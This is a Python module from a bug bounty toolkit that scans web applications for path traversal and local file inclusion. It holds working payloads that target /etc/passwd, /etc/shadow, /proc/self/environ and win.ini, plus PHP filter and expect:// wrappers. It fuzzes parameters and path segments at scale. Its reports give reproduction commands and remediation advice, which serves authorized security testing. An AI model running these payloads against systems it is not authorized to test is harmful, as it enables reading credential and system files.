# Bug Bounty Tool Kit  ─  by Hacker00X1  |  Authorized use only
"""Path Traversal / LFI — ../  encoded, null-byte, and path segment tests."""

import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from data.webfuzz import fetch_url

TRAVERSAL_PAYLOADS = [
    # Basic
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    # URL-encoded
    "..%2Fetc%2Fpasswd", "..%2F..%2Fetc%2Fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    # Double-encoded
    "..%252Fetc%252Fpasswd", "..%252F..%252Fetc%252Fpasswd",
    # Dot-encoded
    "%2e%2e%2fetc%2fpasswd", "%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e%5cetc%5cpasswd",
    # Overlong UTF-8
    "%c0%ae%c0%ae/etc/passwd", "%c0%af..%c0%afetc%c0%afpasswd",
    # Null byte
    "../../etc/passwd%00", "../etc/passwd%00.jpg",
    "../../etc/passwd\x00",
    # Doubled slashes
    "....//etc/passwd", "....//....//etc/passwd",
    ".././.././etc/passwd",
    # Windows
    "../windows/win.ini", "..\\..\\windows\\win.ini",
    "..%5C..%5Cwindows%5Cwin.ini",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
    "..\\..\\.\\windows\\win.ini",
    # Absolute paths
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
    "/proc/self/environ", "/proc/version", "/proc/net/tcp",
    "C:\\Windows\\win.ini", "C:\\boot.ini",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=string.toupper/resource=/etc/passwd",
    "expect://id",
    # Bypass double-slash strip
    "..././etc/passwd", "..././..././etc/passwd",
]

FILE_PARAMS = [
    "file","path","page","include","doc","document","filename","filepath",
    "load","read","template","view","resource","src","source","dir","folder",
    "img","image","url","fetch","module","conf","data","input","content",
    "f","p","q","lang","locale","theme","skin","layout","style","format",
]

UNIX_SIGS = ["root:x:","root:0:0:","/bin/bash","/bin/sh","nobody:","daemon:","www-data:"]
WIN_SIGS  = ["[extensions]","[fonts]","for 16-bit","mci extensions","[boot loader]"]

CVSS_CRIT = "9.1 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
CVSS_HIGH = "7.5 (High)     — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"


def _test_param(base_url: str, param: str, timeout: int) -> list[dict]:
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    for payload in TRAVERSAL_PAYLOADS:
        test_qs = {param: [payload]}
        test_url = urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode(test_qs, doseq=True)
        ))
        resp = fetch_url(test_url, timeout=timeout)
        if not resp:
            continue
        body = resp.get("body") or ""
        for sig in UNIX_SIGS:
            if sig in body:
                return [{
                    "type": "Path Traversal / LFI",
                    "severity": "CRITICAL",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "file_indicator": sig,
                    "cvss": CVSS_CRIT,
                    "description": f"Path traversal in '{param}' — /etc/passwd exposed (indicator: '{sig}').",
                    "steps_to_reproduce": (
                        f"1. curl -s '{test_url}'\n"
                        f"2. Observe '{sig}' in response — server file system readable."
                    ),
                    "impact": "Read arbitrary files: /etc/shadow (password hashes), SSH keys, source code, config files with credentials.",
                    "recommendation": "Canonicalize paths with os.path.realpath(). Validate against a chroot/basedir. Reject inputs containing '../'. Use allowlists for file names.",
                }]
        for sig in WIN_SIGS:
            if sig in body.lower():
                return [{
                    "type": "Path Traversal / LFI (Windows)",
                    "severity": "CRITICAL",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "file_indicator": sig,
                    "cvss": CVSS_CRIT,
                    "description": f"Path traversal in '{param}' — win.ini exposed.",
                    "steps_to_reproduce": f"1. curl -s '{test_url}'\n2. Observe Windows file content.",
                    "impact": "Read Windows system files, registry exports, IIS configs.",
                    "recommendation": "Validate file paths strictly. Use Path.resolve() and confirm path starts within allowed directory.",
                }]
    return []


def _test_path_segments(base_url: str, timeout: int) -> list[dict]:
    parsed = urllib.parse.urlparse(base_url)
    parts = [p for p in parsed.path.split("/") if p]
    for i in range(len(parts)):
        for payload in TRAVERSAL_PAYLOADS[:10]:
            new_parts = parts[:]
            new_parts[i] = payload
            new_path = "/" + "/".join(new_parts)
            test_url = urllib.parse.urlunparse(parsed._replace(path=new_path))
            resp = fetch_url(test_url, timeout=timeout)
            if resp:
                body = resp.get("body") or ""
                for sig in UNIX_SIGS + WIN_SIGS:
                    if sig in body:
                        return [{
                            "type": "Path Traversal (URL Segment)",
                            "severity": "CRITICAL",
                            "url": test_url,
                            "segment_index": i,
                            "payload": payload,
                            "cvss": CVSS_CRIT,
                            "description": f"Path traversal via URL segment [{i}] — sensitive file exposed.",
                            "steps_to_reproduce": f"1. curl -s '{test_url}'\n2. Observe file system content.",
                            "impact": "Arbitrary file read from server.",
                            "recommendation": "Validate and canonicalize all URL path components. Strip traversal sequences at the router level.",
                        }]
    return []


def run(base_url: str, domain: str = "", timeout: int = 4, threads: int = 15, **kwargs) -> dict:
    findings: list[dict] = []
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query)
    params = list(qs.keys()) + [p for p in FILE_PARAMS if p not in qs]

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(_test_param, base_url, p, timeout) for p in params]
        futures.append(ex.submit(_test_path_segments, base_url, timeout))
        for fut in as_completed(futures):
            findings.extend(fut.result())

    return {
        "findings": findings,
        "summary": {
            "params_tested": len(params),
            "payloads_used": len(TRAVERSAL_PAYLOADS),
            "vulnerable": len(findings),
        },
    }


if __name__ == "__main__":
    pass
